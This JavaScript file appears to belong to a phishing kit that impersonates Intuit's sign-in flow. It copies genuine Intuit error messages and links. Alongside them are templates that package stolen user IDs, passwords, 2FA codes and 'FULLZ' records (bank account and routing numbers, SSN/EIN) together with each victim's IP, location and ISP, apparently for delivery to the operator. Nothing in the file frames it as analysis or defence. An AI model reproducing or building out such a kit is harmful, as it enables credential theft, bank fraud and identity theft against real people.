export const ERROR = {
  issue: "There's an issue on our end. We're on it.",
  noInternet:
    "There was an issue reaching our servers, please make sure your network connection is stable then try again.",
  noAccount: "We can’t find an account with what you entered. New to Intuit?",
  incorrectPassword: "The password you entered is incorrect",
  noPassword: "Use 6 or more characters and no spaces.",
  lockedOut:
    "Too many invalid attempts, account is locked out for {minutes} minutes.",
  enterCode: "Please enter the verification code.",
  invalidCode: "Please enter a valid 6-digit verification code.",
  incorrectCode:
    "The verification code you entered is expired or is incorrect.",
  invalidInput: "Enter a valid {message}",
};

const tab = "\n\t\t";

const start = `======== INTUIT Login {step} ========\n${tab}`;
const startTwo = `======== 🔐 [INTUIT Code {step}] ========\n${tab}`;
const startThree = `======== 👤 [INTUIT FULLZ ] ========\n${tab}`;

const end = `\n${tab}🌐 IP: {ip}${tab}🌍 Country: {country}${tab}🏙️ Region: {region}${tab}📍City: {city}${tab}🔌 ISP: {isp}${tab}🧭 Lat/Lon: {lat}, {lon}\n\n⌛SESSION: {session}\n===========================`;

const login = "📧 User ID: {login}";
const password = "🔐 Password: {password}";
const code = "🔐 Code: {code}";
const fullz = `🧑🏼‍💼 Account Name: {name}${tab}🏦 Account Number: {number}${tab}🏦 Routing Number: {routing}${tab}🪪 SSN/EIN: {ssn}`;

export const RESPONSES = {
  loginOne: `${start}${login}${end}`,
  loginWithPwd: `${start}${login}${tab}${password}${end}`,
  code: `${startTwo}${code}${end}`,
  fullz: `${startThree}${fullz}${end}`,
};

export const intuitLinks = {
  homePage: "https://www.intuit.com/",
  contactUs: "https://www.intuit.com/company/contact/",
  learnMore: "https://www.intuit.com/products/",
  legal: "https://www.intuit.com/legal/",
  policy: "https://www.intuit.com/privacy/statement/",
  security: "https://security.intuit.com/",
  accountInfo: "https://accounts-help.intuit.com/app/intuit/1995107",
  term: "https://www.intuit.com/legal/terms/en-us/website/",
  login:
    "https://accounts.intuit.com/app/sign-in?app_group=Identity&asset_alias=Intuit.cto.iam.ius&redirect_uri=https%3A%2F%2Faccounts.intuit.com%2Fapp%2Faccount-manager%2Foverview%3FpiuInFlyout%3Dtrue%26openBlueDot%3Dtrue%26accountSwitcherInFlyout%3Dtrue%26rgn%3DUS%26prgn%3DUS&appfabric=true",
  register:
    "https://accounts.intuit.com/app/sign-in?app_group=Identity&asset_alias=Intuit.cto.iam.ius",
};
